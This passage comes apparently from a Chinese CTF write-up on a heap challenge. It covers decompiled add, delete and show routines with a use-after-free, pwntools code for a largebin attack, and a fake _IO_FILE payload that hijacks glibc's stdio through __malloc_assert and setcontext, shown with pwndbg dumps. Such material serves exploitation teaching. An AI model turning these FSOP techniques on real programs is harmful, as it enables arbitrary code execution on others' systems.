<span class=\"number\">0x7f56881234b0</span> &lt;_IO_default_imbue&gt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改后 (地址不一样，看偏移)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x562fcda56370</span></span><br><span class=\"line\">$<span class=\"number\">7</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x451</span> &lt;error: Cannot access memory at address <span class=\"number\">0x451</span>&gt;,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f2b2d5cc0e0</span> &lt;main_arena+<span class=\"number\">1120</span>&gt; <span class=\"string\">&quot; t\\245\\315/V&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x562fcda55290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x562fcda55290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f2b2d5cc840</span> &lt;_IO_2_1_stdout_+<span class=\"number\">192</span>&gt; <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x1</span> &lt;error: Cannot access memory at address <span class=\"number\">0x1</span>&gt;,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x562fcda57cd0</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f2b2d405a6d</span> &lt;setcontext+<span class=\"number\">61</span>&gt; <span class=\"string\">&quot;H\\213\\242\\240&quot;</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>,</span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x562fcda56000</span>,</span><br><span class=\"line\">    _offset = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x562fcda563a0</span>,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>,</span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">19</span> times&gt;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f2b2d5c80d0</span> &lt;_IO_wfile_jumps+<span class=\"number\">16</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p _IO_file_jumps</span><br><span class=\"line\">$<span class=\"number\">8</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x7f2b2d43e070</span> &lt;_IO_new_file_finish&gt;,</span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7f2b2d43ee40</span> &lt;_IO_new_file_overflow&gt;,</span><br><span class=\"line\">  __underflow = <span class=\"number\">0x7f2b2d43eb30</span> &lt;_IO_new_file_underflow&gt;,</span><br><span class=\"line\">  __uflow = <span class=\"number\">0x7f2b2d43fde0</span> &lt;__GI__IO_default_uflow&gt;,</span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x7f2b2d441300</span> &lt;__GI__IO_default_pbackfail&gt;,</span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x7f2b2d43d680</span> &lt;_IO_new_file_xsputn&gt;,</span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x7f2b2d43d330</span> &lt;__GI__IO_file_xsgetn&gt;,</span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x7f2b2d43c960</span> &lt;_IO_new_file_seekoff&gt;,</span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x7f2b2d440530</span> &lt;_IO_default_seekpos&gt;,</span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x7f2b2d43c620</span> &lt;_IO_new_file_setbuf&gt;,</span><br><span class=\"line\">  __sync = <span class=\"number\">0x7f2b2d43c4b0</span> &lt;_IO_new_file_sync&gt;,</span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x7f2b2d430b90</span> &lt;__GI__IO_file_doallocate&gt;,</span><br><span class=\"line\">  __read = <span class=\"number\">0x7f2b2d43d9b0</span> &lt;__GI__IO_file_read&gt;,</span><br><span class=\"line\">  __write = <span class=\"number\">0x7f2b2d43cf40</span> &lt;_IO_new_file_write&gt;,</span><br><span class=\"line\">  __seek = <span class=\"number\">0x7f2b2d43c6f0</span> &lt;__GI__IO_file_seek&gt;,</span><br><span class=\"line\">  __close = <span class=\"number\">0x7f2b2d43c610</span> &lt;__GI__IO_file_close&gt;,</span><br><span class=\"line\">  __stat = <span class=\"number\">0x7f2b2d43cf30</span> &lt;__GI__IO_file_stat&gt;,</span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x7f2b2d4414a0</span> &lt;_IO_default_showmanyc&gt;,</span><br><span class=\"line\">  __imbue = <span class=\"number\">0x7f2b2d4414b0</span> &lt;_IO_default_imbue&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们看到这里对应的入口点就是 xsputn。当__malloc_assert 进行 __fxprintf 调用的时候，进行错误输出的时候，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__fxprintf  ————》》</span><br><span class=\"line\"></span><br><span class=\"line\">locked_vfxprintf  ————》》</span><br><span class=\"line\">__vfprintf_internal \t————》》\t\t//0x7f6fb038d15d &lt;__vfprintf_internal+173&gt;    call   *ABS*+0xab090@plt </span><br><span class=\"line\">__strchrnul_avx2;ret</span><br><span class=\"line\">__libc_cleanup_push_defer;ret</span><br><span class=\"line\">0x7f6fb038d1c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]\t//调用目标函数&lt;__GI__IO_wfile_seekoff&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"下面我们直接来看题目\"><a class=\"markdownIt-Anchor\" href=\"#下面我们直接来看题目\">#</a> 下面我们直接来看题目。</h3>\n<p>开始的逆向过程就不再赘述。</p>\n<p>程序确实实现了增删改查的功能，但是对于改的次数做出了严格的限制，只允许进行两次更改，而且程序没有结束功能，也就是说，我们如果想利用 io 必须触发报错__malloc_assert。由于我们只有两次修改的机会，那么其实我们已经想好了怎么做，一次用来出发报错，一次用来伪造 io 结构。</p>\n<p>我们来看程序的实现，</p>\n<h4 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> add</h4>\n<p>在创建的 chunk 的时候，最多允许我们创建 16 个 cat，并且对 size 的大小进行了限制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">size &lt;= <span class=\"number\">0x417</span> || size &gt; <span class=\"number\">0x46F</span></span><br></pre></td></tr></table></figure>\n<p>只允许的 largebin 范围的堆块的创建</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 idx; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  writen(<span class=\"string\">&quot;plz input your cat idx:\\n&quot;</span>);</span><br><span class=\"line\">  idx = getint();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">0xF</span> || <span class=\"built_in\">list</span>[idx] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;invalid!\\n&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;plz input your cat size:\\n&quot;</span>);</span><br><span class=\"line\">    size = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x417</span> || size &gt; <span class=\"number\">0x46F</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      writen(<span class=\"string\">&quot;invalid size!\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">list</span>[idx] = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, size);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"built_in\">list</span>[idx] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        size_list[idx] = size;</span><br><span class=\"line\">        writen(<span class=\"string\">&quot;plz input your content:\\n&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, <span class=\"built_in\">list</span>[idx], size_list[idx]);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        writen(<span class=\"string\">&quot;error!\\n&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同时，因为使用 了 calloc 函数，会对我们申请出来的 chunk 进行一个初始化。read 允许我们输入空字符。</p>\n<p>接下来我们看看删除</p>\n<h4 id=\"delete\"><a class=\"markdownIt-Anchor\" href=\"#delete\">#</a> delete</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v0; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  writen(<span class=\"string\">&quot;plz input your cat idx:\\n&quot;</span>);</span><br><span class=\"line\">  v0 = getint();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xF</span> &amp;&amp; <span class=\"built_in\">list</span>[v0] )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(<span class=\"built_in\">list</span>[v0]);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    writen(<span class=\"string\">&quot;invalid!\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>明显的一个 uaf，可以用来泄露数据。</p>\n<p>所以我们在看下 show</p>\n<h4 id=\"show\"><a class=\"markdownIt-Anchor\" href=\"#show\">#</a> show</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">show</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v0; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  writen(<span class=\"string\">&quot;plz input your cat idx:\\n&quot;</span>);</span><br><span class=\"line\">  v0 = getint();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xF</span> &amp;&amp; <span class=\"built_in\">list</span>[v0] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;Context:\\n&quot;</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"built_in\">list</span>[v0], <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    writen(<span class=\"string\">&quot;invalid!\\n&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 write，允许输出空字符，最多输出 0x30 字节，这已经够了，我们只要释放两个不相连的 chunk 就可以实现两地址的泄露，但是，这里要注意到，这个 uaf 的负面影响就是，我们不可以再向对应的 idx 申请 chunk，所以我们要控制数量。</p>\n<h4 id=\"攻击\"><a class=\"markdownIt-Anchor\" href=\"#攻击\">#</a> 攻击</h4>\n<p>简单的布局下 chunk，泄露出两个地址， 然后准备进行 largebinattack</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x450</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x430</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">0x440</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)     <span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">5</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">8</span>)  <span class=\"comment\">#5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x460</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">8</span>)  <span class=\"comment\">#6</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>chunk 的情况</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x5609eb575000</span></span><br><span class=\"line\">Size: <span class=\"number\">0x291</span></span><br><span class=\"line\"></span><br><span class=\"line\">Free <span class=\"title function_\">chunk</span> <span class=\"params\">(largebins)</span> | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb575290</span><br><span class=\"line\">Size: 0x451</span><br><span class=\"line\">fd: 0x7f2adf8f70e0</span><br><span class=\"line\">bk: 0x5609eb575b00</span><br><span class=\"line\">fd_nextsize: 0x5609eb575b00</span><br><span class=\"line\">bk_nextsize: 0x5609eb575b00</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x5609eb5756e0</span><br><span class=\"line\">Size: 0x420</span><br><span class=\"line\"></span><br><span class=\"line\">Free <span class=\"title function_\">chunk</span> <span class=\"params\">(largebins)</span> | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb575b00</span><br><span class=\"line\">Size: 0x461</span><br><span class=\"line\">fd: 0x5609eb575290</span><br><span class=\"line\">bk: 0x7f2adf8f70e0</span><br><span class=\"line\">fd_nextsize: 0x5609eb575290</span><br><span class=\"line\">bk_nextsize: 0x5609eb575290</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x5609eb575f60</span><br><span class=\"line\">Size: 0x420</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb576380</span><br><span class=\"line\">Size: 0x441</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb5767c0</span><br><span class=\"line\">Size: 0x471</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5609eb576c30</span><br><span class=\"line\">Size: 0x1f3d1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>接下来就是获取到_IO_list_all 的位置，然后进行伪造 iofile</p>\n<p>伪造的模板，作者已经提供了，这里是用到了 setcontext 进行参数的设置，我们需要手动更改下 fake_io_addr 的地址为我们控制的 chunk 地址，这里就是 largebin attack 生效的攻击地址。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_io_addr=heapbase+<span class=\"number\">0xb00</span></span><br><span class=\"line\">next_chain = <span class=\"number\">0</span></span><br><span class=\"line\">fake_IO_FILE=p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0xb0</span>)<span class=\"comment\">#_IO_backup_base=setcontext_rdx</span></span><br><span class=\"line\">fake_IO_FILE +=p64(setcontext+<span class=\"number\">61</span>)<span class=\"comment\">#_IO_save_end=call addr(call setcontext)</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x58</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">0</span>)  <span class=\"comment\"># _chain</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x78</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(heapbase+<span class=\"number\">0x1000</span>)  <span class=\"comment\"># _lock = a writable address</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0x30</span>)<span class=\"comment\">#_wide_data,rax1_addr</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xB0</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">0</span>)  <span class=\"comment\"># _mode = 0</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xC8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(libcbase+<span class=\"number\">0x2160c0</span>+<span class=\"number\">0x10</span>)  <span class=\"comment\"># vtable=IO_wfile_jumps+0x10</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span></span><br><span class=\"line\">fake_IO_FILE += p64(fake_io_addr+<span class=\"number\">0x40</span>)  <span class=\"comment\"># rax2_addr</span></span><br></pre></td></tr></table></figure>\n<p>伪造好后的_io_file</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f85fb7ee680</span> &lt;_IO_list_all&gt;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7f85fb7ee680</span> </span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x563e47a6c370</span></span><br><span class=\"line\">pwndbg&gt; p*(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x563e47a6c370</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x451</span> &lt;error: Cannot access memory at address <span class=\"number\">0x451</span>&gt;,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f85fb7ee0e0</span> &lt;main_arena+<span class=\"number\">1120</span>&gt; <span class=\"string\">&quot;\\320\\340~\\373\\205\\177&quot;</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x563e47a6b290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x563e47a6b290</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f85fb7ee660</span> &lt;_nl_global_locale+<span class=\"number\">224</span>&gt; <span class=\"string\">&quot;\\327\\341z\\373\\205\\177&quot;</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x1</span> &lt;error: Cannot access memory at address <span class=\"number\">0x1</span>&gt;,</span><br><span class=\"line\">    